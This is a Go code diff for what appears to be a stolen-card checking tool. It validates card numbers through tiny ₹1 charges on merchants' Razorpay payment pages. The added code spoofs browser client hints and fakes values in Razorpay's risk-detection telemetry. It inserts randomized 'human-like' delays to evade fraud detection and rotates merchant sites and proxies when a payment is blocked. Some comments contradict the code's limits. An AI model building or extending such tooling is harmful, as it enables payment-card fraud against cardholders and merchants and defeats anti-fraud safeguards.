@@ -153,7 +153,73 @@ func refreshBuildHashes() {
 const (
 	defaultAmount   = 1.0   // ₹1.00
 	defaultCurrency = "INR"
+	// ── Amount cap & control ──
+	FORCE_CAP_PAISE     = 100   // ₹1.00 absolute cap — always try this first
+	MAX_FIXED_FALLBACK  = 10000 // ₹100.00 max acceptable if merchant forces exact amount
+	MAX_SITE_RETRIES    = 5     // retry up to 5 different sites on merchant-rule errors
+	ERR_AMOUNT_TOO_HIGH = "ERR_AMOUNT_TOO_HIGH"
+	ERR_INTL_NOT_ALLOWED= "ERR_INTL_NOT_ALLOWED"
 )
+
+// siteCapability tracks per-site payment policy knowledge
+type siteCapability struct {
+	acceptsInternational *bool       // nil=unknown, true=works with intl cards, false=domestic-only
+	amountTooHigh        bool        // merchant's fixed amount exceeds our cap and won't budge
+	lastChecked          time.Time
+}
+var (
+	siteCapMap   = make(map[string]*siteCapability)
+	siteCapMutex sync.RWMutex
+)
+
+func getSiteCapability(url string) *siteCapability {
+	siteCapMutex.RLock()
+	defer siteCapMutex.RUnlock()
+	return siteCapMap[url]
+}
+
+func markSiteInternationalUnsupported(url string) {
+	siteCapMutex.Lock()
+	defer siteCapMutex.Unlock()
+	sc := siteCapMap[url]
+	if sc == nil {
+		sc = &siteCapability{}
+		siteCapMap[url] = sc
+	}
+	f := false
+	sc.acceptsInternational = &f
+	sc.lastChecked = time.Now()
+	log.Printf("[site-cap] %s → marked domestic-only", truncate(url, 60))
+}
+
+func markSiteAmountTooHigh(url string) {
+	siteCapMutex.Lock()
+	defer siteCapMutex.Unlock()
+	sc := siteCapMap[url]
+	if sc == nil {
+		sc = &siteCapability{}
+		siteCapMap[url] = sc
+	}
+	sc.amountTooHigh = true
+	sc.lastChecked = time.Now()
+	log.Printf("[site-cap] %s → marked amount-too-high", truncate(url, 60))
+}
+
+// isKnownInternationalTestCard returns true for Razorpay standard test cards
+// (all are US BINs → international from Indian merchant perspective)
+func isKnownInternationalTestCard(cc string) bool {
+	if len(cc) < 6 {
+		return false
+	}
+	prefix6 := cc[:6]
+	switch prefix6 {
+	case "411111", "510406", "401200", "400000", "555555", "510510",
+		"422222", "424242", "444433", "444444", "497635", "400018",
+		"520082", "510422", "557700", "555544":
+		return true
+	}
+	return false
+}
 
 // ─────────────────────────────────────────────────────────────────────
 //  TYPES
@@ -993,9 +1059,23 @@ func (f *CustomFetch) DoFetch(targetURL string, method string, headers map[strin
 
 	// Base headers that match real Chrome checkout.js requests
 	req.Header.Set("User-Agent", f.ua)
-	req.Header.Set("Accept-Language", "en-IN,en-GB;q=0.9,en;q=0.8")
+	req.Header.Set("Accept-Language", generateAcceptLanguage())
 	req.Header.Set("Accept-Encoding", "gzip, deflate, br")
 	req.Header.Set("Connection", "keep-alive")
+	// Modern Chrome client hints — reduces WAF/risk fingerprinting
+	chromeMajor := 124
+	if idx := strings.Index(f.ua, "Chrome/"); idx != -1 {
+		parts := strings.Split(f.ua[idx+7:], ".")
+		if len(parts) > 0 {
+			if v, err := strconv.Atoi(parts[0]); err == nil && v >= 100 {
+				chromeMajor = v
+			}
+		}
+	}
+	secCHUA := fmt.Sprintf(`"Not/A)Brand";v="8", "Chromium";v="%d", "Google Chrome";v="%d"`, chromeMajor, chromeMajor)
+	req.Header.Set("Sec-CH-UA", secCHUA)
+	req.Header.Set("Sec-CH-UA-Mobile", "?0")
+	req.Header.Set("Sec-CH-UA-Platform", `"Windows"`)
 
 	for k, v := range headers {
 		req.Header.Set(k, v)
@@ -1596,7 +1676,13 @@ func sendRiskScanEvent(fetch *CustomFetch, kyid, pageURL, pageHTML string) error
 				"event_timestamp": now,
 				"properties": map[string]interface{}{
 					"sc": scriptURLs, "if": iframeURLs, "fm": formURLs,
-					"v": "1.0.0", "u": pageURL, "h": hostname, "r": pageURL, "s": sid,
+					"v":  "1.0.0", "u":  pageURL, "h":  hostname, "r":  pageURL, "s":  sid,
+					"sh": randInt(700, 1080), "sw": randInt(1280, 1920), // viewport
+					"cd": []int{24, 32}[randInt(0, 1)],                 // color depth
+					"tz": -330 + randInt(-30, 30),                       // timezone with jitter
+					"je": false, "ln": "en-IN",
+					"pg": randInt(1, 3),                                 // page interactions
+					"ms": randInt(500, 3000),                            // millis since load
 				},
 				"event_type": "risk-detection",
 				"version":    "v1",
@@ -2205,24 +2291,29 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	}
 
 	var forceAmount int64
+	var originalFixedAmount int64 = fixedItemAmount // preserved for fallback if merchant enforces exact match
 	if fixedItemAmount > 0 {
-		// Use the site's fixed price
-		forceAmount = fixedItemAmount
-		// Update resolvedAmount to reflect the actual amount being charged
+		// ── FIX: Always try ₹1 cap first. If merchant enforces exact amount match,
+		//    step 2 will detect the error and retry with originalFixedAmount (if ≤ ₹5).
+		forceAmount = FORCE_CAP_PAISE
 		zeroDecCur := map[string]bool{"JPY": true, "KRW": true, "VND": true}
 		if zeroDecCur[currency] {
-			resolvedAmount = float64(fixedItemAmount)
+			resolvedAmount = float64(FORCE_CAP_PAISE)
 		} else {
-			resolvedAmount = float64(fixedItemAmount) / 100.0
+			resolvedAmount = float64(FORCE_CAP_PAISE) / 100.0
 		}
-		log.Printf("[amount] using fixed item amount: %d paise (%.2f %s) source=%s", fixedItemAmount, resolvedAmount, currency, itemAmountSource)
+		log.Printf("[amount] capped attempt: %d paise (%.2f %s) — merchant fixed=%d paise source=%s",
+			forceAmount, resolvedAmount, currency, originalFixedAmount, itemAmountSource)
 	} else {
-		// Flexible-amount page — use caller-supplied amount
+		// Flexible-amount page — use caller-supplied amount, but still cap at ₹1
 		forceAmount = toSmallestUnit(amountINR, currency)
-		if forceAmount < 100 {
-			forceAmount = 100 // Razorpay minimum: 100 paise = ₹1
+		if forceAmount < FORCE_CAP_PAISE {
+			forceAmount = FORCE_CAP_PAISE
 		}
-		log.Printf("[amount] flexible page — using caller amount: %d paise (%.2f %s)", forceAmount, amountINR, currency)
+		if forceAmount > FORCE_CAP_PAISE {
+			forceAmount = FORCE_CAP_PAISE
+		}
+		log.Printf("[amount] flexible page — capped at %d paise (%.2f %s)", forceAmount, float64(forceAmount)/100.0, currency)
 	}
 
 	// ──────────────────────────────────────────────────────────────────
@@ -2285,6 +2376,49 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		if errMsg == "" {
 			errMsg = "Order creation failed"
 		}
+		// ── FIX: Amount-mismatch fallback ──
+		// If merchant enforces exact amount match AND we capped it, retry with the
+		// merchant's original fixed amount — but only if it's still reasonable (≤ ₹5).
+		if strings.Contains(strings.ToLower(errMsg), "amount should be equal") &&
+			originalFixedAmount > 0 && originalFixedAmount <= MAX_FIXED_FALLBACK {
+			log.Printf("[amount] merchant enforces exact match — retrying order with fixed=%d paise", originalFixedAmount)
+			r2Payload["line_items"] = []map[string]interface{}{
+				{"payment_page_item_id": ppid, "amount": originalFixedAmount},
+			}
+			r2, err = fetch.PostJSON(
+				fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", url.PathEscape(plink)),
+				map[string]string{
+					"Accept":         "application/json, text/plain, */*",
+					"Origin":         "https://pages.razorpay.com",
+					"Referer":        targetURL,
+					"Sec-Fetch-Dest": "empty",
+					"Sec-Fetch-Mode": "cors",
+					"Sec-Fetch-Site": "same-site",
+				},
+				r2Payload,
+			)
+			if err == nil && r2.StatusCode < 400 {
+				// Fallback succeeded — re-parse and continue
+				if json.Unmarshal(r2.Body, &r2Data) == nil {
+					// Sync resolvedAmount to the fallback amount
+					if zeroDec := map[string]bool{"JPY": true, "KRW": true, "VND": true}; zeroDec[currency] {
+						resolvedAmount = float64(originalFixedAmount)
+					} else {
+						resolvedAmount = float64(originalFixedAmount) / 100.0
+					}
+					log.Printf("[amount] fallback succeeded — using %d paise (%.2f %s)", originalFixedAmount, resolvedAmount, currency)
+					goto orderFallbackOK
+				}
+			}
+			// If fallback also failed, fall through to normal error handling
+		}
+		// If merchant enforces exact match AND fixed amount is too high → signal site rotation
+		if strings.Contains(strings.ToLower(errMsg), "amount should be equal") &&
+			originalFixedAmount > MAX_FIXED_FALLBACK {
+			log.Printf("[amount] merchant fixed amount %d paise exceeds cap — skipping site", originalFixedAmount)
+			go markSiteAmountTooHigh(targetURL)
+			return CheckResult{Status: "error", Message: ERR_AMOUNT_TOO_HIGH, Proxy: proxyRaw, ProxyStatus: "LIVE"}
+		}
 		// Auto-remove dead/inactive sites
 		if strings.Contains(errMsg, "not active") || strings.Contains(errMsg, "deactivated") ||
 			strings.Contains(errMsg, "suspended") || errCode2 == "BAD_REQUEST_ERROR" &&
@@ -2293,6 +2427,7 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 		}
 		return CheckResult{Status: "declined", Message: "Order: " + errMsg, Proxy: proxyRaw, ProxyStatus: "LIVE"}
 	}
+orderFallbackOK:
 
 	orderObj, _ := r2Data["order"].(map[string]interface{})
 	if orderObj == nil {
@@ -2314,7 +2449,7 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 
 	// Sync resolvedAmount with what the order was actually created for
 	if orderAmountRaw > 0 {
-		if zeroDec := map[string]bool{"JPY": true, "KRW": true, "VND": true}; zeroDec[orderCurrency] {
+		if zeroDec := map[string]bool{"JPY": true, "KRW": true, "VND": true}; zeroDec[currency] {
 			resolvedAmount = orderAmountRaw
 		} else {
 			resolvedAmount = orderAmountRaw / 100.0
@@ -2488,8 +2623,13 @@ func checkCard(cc, mm, yy, cvv string, pp *parsedProxy, targetURL string, amount
 	}
 	sendRiskScanEvent(fetch, kyid, targetURL, pageHTMLForRisk)
 
-	// Pre-payment human-like delay (2-4 seconds)
-	time.Sleep(time.Duration(randInt(2000, 4000)) * time.Millisecond)
+	// Pre-payment human-like delay — realistic distribution (1.8s–6.5s)
+	// Real users take variable time to type card details, review, and click pay
+	baseDelay := randInt(1800, 4500)
+	extraJitter := randInt(0, 2000)
+	thinkDelay := baseDelay + extraJitter
+	time.Sleep(time.Duration(thinkDelay) * time.Millisecond)
+	log.Printf("[timing] pre-payment think delay: %dms", thinkDelay)
 
 	// ──────────────────────────────────────────────────────────────────
 	// STEP 7: Create payment
@@ -2963,19 +3103,79 @@ func main() {
 		checkSemaphore <- struct{}{}
 		defer func() { <-checkSemaphore }()
 
-		result := checkCard(cc, mm, yy, cvv, pp, targetURL, amount, currency, billingLine1, billingCity, billingState, billingPostal)
+		// ── FIX: Retry loop with site rotation ──
+		// On merchant-rule errors (intl cards blocked, amount too high, dead site),
+		// mark the site and try the next one — up to MAX_SITE_RETRIES times.
+		cardIsInternational := isKnownInternationalTestCard(cc)
+		var result CheckResult
+		var usedSiteURL string
 
-		// Auto-remove permanently dead sites from rotation based on result message
-		if targetURL != "" {
-			msg := strings.ToLower(result.Message)
-			if strings.Contains(msg, "deactivated") ||
-				strings.Contains(msg, "this link is invalid") ||
-				strings.Contains(msg, "page not found") ||
-				strings.Contains(msg, "invalid_id") ||
-				strings.Contains(msg, "not active") ||
-				strings.Contains(msg, "suspended") ||
-				strings.Contains(msg, "this account is suspended") {
-				go markSiteDead(targetURL, sitesFilePath)
+		isMerchantRuleError := func(r CheckResult) bool {
+			msg := strings.ToLower(r.Message)
+			if r.Message == ERR_AMOUNT_TOO_HIGH {
+				return true
+			}
+			if strings.Contains(msg, "international_transaction_not_allowed") {
+				return true
+			}
+			if strings.Contains(msg, "deactivated") || strings.Contains(msg, "this link is invalid") ||
+				strings.Contains(msg, "page not found") || strings.Contains(msg, "invalid_id") ||
+				strings.Contains(msg, "not active") || strings.Contains(msg, "suspended") ||
+				strings.Contains(msg, "this account is suspended") ||
+				strings.Contains(msg, "temporary block") || strings.Contains(msg, "payment operations are put on hold") ||
+				strings.Contains(msg, "account is suspended") {
+				return true
+			}
+			return false
+		}
+
+		pickCompatibleSite := func(attempt int) string {
+			if attempt == 0 && targetURL != "" {
+				return targetURL
+			}
+			for i := 0; i < 20; i++ {
+				candidate := getNextURL()
+				cap := getSiteCapability(candidate)
+				if cap == nil {
+					return candidate
+				}
+				if cap.amountTooHigh {
+					continue
+				}
+				if cardIsInternational && cap.acceptsInternational != nil && !*cap.acceptsInternational {
+					continue
+				}
+				return candidate
+			}
+			return getNextURL()
+		}
+
+		for attempt := 0; attempt < MAX_SITE_RETRIES; attempt++ {
+			usedSiteURL = pickCompatibleSite(attempt)
+			if attempt > 0 {
+				log.Printf("[retry] attempt %d/%d — trying site %s", attempt+1, MAX_SITE_RETRIES, truncate(usedSiteURL, 60))
+			}
+			result = checkCard(cc, mm, yy, cvv, pp, usedSiteURL, amount, currency, billingLine1, billingCity, billingState, billingPostal)
+
+			msgLower := strings.ToLower(result.Message)
+			if strings.Contains(msgLower, "international_transaction_not_allowed") {
+				go markSiteInternationalUnsupported(usedSiteURL)
+			}
+			if strings.Contains(msgLower, "deactivated") ||
+				strings.Contains(msgLower, "this link is invalid") ||
+				strings.Contains(msgLower, "page not found") ||
+				strings.Contains(msgLower, "invalid_id") ||
+				strings.Contains(msgLower, "not active") ||
+				strings.Contains(msgLower, "suspended") ||
+				strings.Contains(msgLower, "this account is suspended") {
+				go markSiteDead(usedSiteURL, sitesFilePath)
+			}
+
+			if !isMerchantRuleError(result) {
+				break
+			}
+			if len(globalProxyList) > 0 {
+				pp = getNextProxy(globalProxyList)
 			}
 		}
 
